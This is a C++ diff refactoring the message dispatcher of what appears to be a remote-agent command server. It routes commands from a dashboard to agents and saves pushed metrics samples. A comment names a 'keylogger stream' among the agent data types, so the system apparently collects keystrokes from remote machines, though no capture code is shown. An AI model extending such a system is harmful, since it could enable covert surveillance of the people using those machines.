@@ -31,7 +31,7 @@ void ServerDispatcher::handleFrame(FrameTransport& agent, const Frame& frame) {
       onResponse(connection, frame.payload);
       break;
     case MessageType::DATA:
-      onData(frame.payload);
+      onData(connection, frame.payload);
       break;
     case MessageType::DISCONNECT:
       if (sessionManager_.isDashboardConnection(connection.getFd())) {
@@ -161,7 +161,8 @@ void ServerDispatcher::onResponse(AgentConnection& agent,
 // DATA messages are pushed by the agent without a prior COMMAND
 // (e.g. keylogger stream). Handle them independently of the
 // request/response cycle.
-void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
+void ServerDispatcher::onData(AgentConnection& agent,
+                              const std::vector<std::uint8_t>& payload) {
   const DataPayload data = ProtocolParser::parseDataPayload(payload);
   std::ostringstream what;
   what << "[DATA] subtype=" << static_cast<int>(data.subtype) << "\n";
@@ -176,34 +177,10 @@ void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
 
   switch (data.subtype) {
     case DataType::METRICS_SAMPLE: {
-      frame.header = ProtocolHelper::createHeader(MessageType::DATA, payload);
-      frame.payload = payload;
-      sessionManager_.getAgent(dashboardFd).sendFrame(frame);
-      // TODO For log only, doesn't need to parse it once dashboard will
-      // retrieve it
-      {
-        MetricsSample sample = MetricsParser::parseMetricsSample(data.data);
-
-        what << "[DATA] METRICS_SAMPLE\n";
-
-        what << "CPU: " << sample.cpu.total_percent << "%\n";
-        what << "CPU cores: ";
-        for (float core : sample.cpu.per_core) what << core << "% ";
-        what << '\n';
-
-        what << "Memory: " << sample.mem.phys_used << "/"
-             << sample.mem.phys_total << " bytes used\n";
-
-        for (const auto& disk : sample.disks) {
-          what << "Disk " << disk.device << " R=" << disk.read_bytes_per_sec
-               << " W=" << disk.write_bytes_per_sec << '\n';
-        }
-
-        for (const auto& iface : sample.interfaces) {
-          what << "Net " << iface.iface << " RX=" << iface.rx_bytes_per_sec
-               << " TX=" << iface.tx_bytes_per_sec << '\n';
-        }
-      }
+     frame = metricsService_.save(agent.getId(),
+                           MetricsParser::parseMetricsSample(data.data));
+      sessionManager_.getDashboard().sendFrame(frame);
+      // todo use metrics service
     } break;
     case DataType::HEALTH_CHECK: {
       what << "health check not implemented yet";
@@ -226,10 +203,6 @@ void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
     }
   }
 
-  if (sessionManager_.isDashboard()) {
-    frame.payload = payload;
-    sessionManager_.getDashboard().sendFrame(frame);
-  }
   Logger::info("server dispatcher", what.str());
 }
 
@@ -243,7 +216,7 @@ void ServerDispatcher::onDashboardCommand(
         sessionManager_.getAgentByTarget(commandDashboard.target);
     commandService_.save(commandDashboard);
     sendCommand(agent, commandDashboard.command);
-    
+
   } catch (const std::exception& e) {
     dashboard.sendError(ErrorType::UNKNOWN_COMMAND,
                         "Agent target not found: " + commandDashboard.target);
@@ -306,7 +279,6 @@ void ServerDispatcher::sendDisconnect(AgentConnection& agent) {
   agent.sendFrame(frame);
   Logger::info("server dispatcher", "[DISCONNECT]");
 }
-
 
 // TODO DASHBOARD SHOULD GET THESE
 
